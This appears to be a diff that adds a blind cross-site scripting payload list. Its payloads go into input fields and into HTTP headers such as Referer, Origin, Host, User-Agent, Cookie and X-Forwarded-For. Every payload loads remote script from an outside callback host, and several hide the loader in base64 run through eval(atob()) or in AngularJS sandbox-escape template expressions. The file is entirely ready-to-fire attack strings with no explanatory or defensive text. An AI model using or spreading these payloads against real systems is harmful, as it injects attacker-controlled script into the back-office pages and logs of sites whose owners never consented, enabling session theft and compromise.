@@ -1,0 +1,49 @@
+Blind XSS Header Payload Without Headers:
+'\"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYXBwc2VjYnl0ZXMueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))>
+'"><script src=https://appsecbytes.xss.ht></script>
+'\"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYXBwc2VjYnl0ZXMueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))><script src=https://appsecbytes.xss.ht></script>
+'"><script src=https://appsecbytes.xss.ht></script>
+'"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYXBwc2VjYnl0ZXMueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))>
+javascript:eval('var a=document.createElement(\'script\');a.src=\'https://appsecbytes.xss.ht\';document.body.appendChild(a)')
+{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'eval("var _ = document.createElement(\'script\');_.src=\'https://appsecbytes.xss.ht/m\';document.getElementsByTagName(\'body\')[0].appendChild(_)")')()}}
+{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'eval("var _ = document.createElement(\'img\');_.src=\'https://appsecbytes.xss.ht/m\';document.getElementsByTagName(\'body\')[0].appendChild(_)")')()}}
+
+
+Blind XSS Header Payload With Headers:
+Referer: '\"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYXBwc2VjYnl0ZXMueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))>
+Referer: '"><script src=https://appsecbytes.xss.ht></script>
+Referer: javascript:eval('var a=document.createElement(\'script\');a.src=\'https://appsecbytes.xss.ht\';document.body.appendChild(a)')
+Referer: '\"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYXBwc2VjYnl0ZXMueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))><script src=https://appsecbytes.xss.ht></script>
+Referer: '"><script src=https://appsecbytes.xss.ht></script>
+Referer: '"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYXBwc2VjYnl0ZXMueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))>
+Origin: '\"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYXBwc2VjYnl0ZXMueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))>
+Origin: '"><script src=https://appsecbytes.xss.ht></script>
+Origin: javascript:eval('var a=document.createElement(\'script\');a.src=\'https://appsecbytes.xss.ht\';document.body.appendChild(a)')
+Origin: '\"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYXBwc2VjYnl0ZXMueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))><script src=https://appsecbytes.xss.ht></script>
+Origin: '"><script src=https://appsecbytes.xss.ht></script>
+Origin: '"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYXBwc2VjYnl0ZXMueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))>
+Host: '\"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYXBwc2VjYnl0ZXMueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))>
+Host: '"><script src=https://appsecbytes.xss.ht></script>
+Host: javascript:eval('var a=document.createElement(\'script\');a.src=\'https://appsecbytes.xss.ht\';document.body.appendChild(a)')
+Host: '\"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYXBwc2VjYnl0ZXMueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))><script src=https://appsecbytes.xss.ht></script>
+Host: '"><script src=https://appsecbytes.xss.ht></script>
+Host: '"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYXBwc2VjYnl0ZXMueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))>
+User-Agent: '\"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYXBwc2VjYnl0ZXMueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))>
+User-Agent: '"><script src=https://appsecbytes.xss.ht></script>
+User-Agent: javascript:eval('var a=document.createElement(\'script\');a.src=\'https://appsecbytes.xss.ht\';document.body.appendChild(a)')
+User-Agent: '\"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYXBwc2VjYnl0ZXMueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))><script src=https://appsecbytes.xss.ht></script>
+User-Agent: '"><script src=https://appsecbytes.xss.ht></script>
+User-Agent: '"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYXBwc2VjYnl0ZXMueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))>
+Cookie: '\"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYXBwc2VjYnl0ZXMueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))>
+Cookie: '"><script src=https://appsecbytes.xss.ht></script>
+Cookie: javascript:eval('var a=document.createElement(\'script\');a.src=\'https://appsecbytes.xss.ht\';document.body.appendChild(a)')
+Cookie: '\"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYXBwc2VjYnl0ZXMueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))><script src=https://appsecbytes.xss.ht></script>
+Cookie: '"><script src=https://appsecbytes.xss.ht></script>
+Cookie: '"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYXBwc2VjYnl0ZXMueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))>
+X-Forwarded-For: '>"></title></style></textarea></script><script/src=appsecbytes.xss.ht></script>
+X-Forwarded-For: '\"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYXBwc2VjYnl0ZXMueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))>
+X-Forwarded-For: '"><script src=https://appsecbytes.xss.ht></script>
+X-Forwarded-For: javascript:eval('var a=document.createElement(\'script\');a.src=\'https://appsecbytes.xss.ht\';document.body.appendChild(a)')
+X-Forwarded-For: '\"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYXBwc2VjYnl0ZXMueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))><script src=https://appsecbytes.xss.ht></script>
+X-Forwarded-For: '"><script src=https://appsecbytes.xss.ht></script>
+X-Forwarded-For: '"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYXBwc2VjYnl0ZXMueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))>
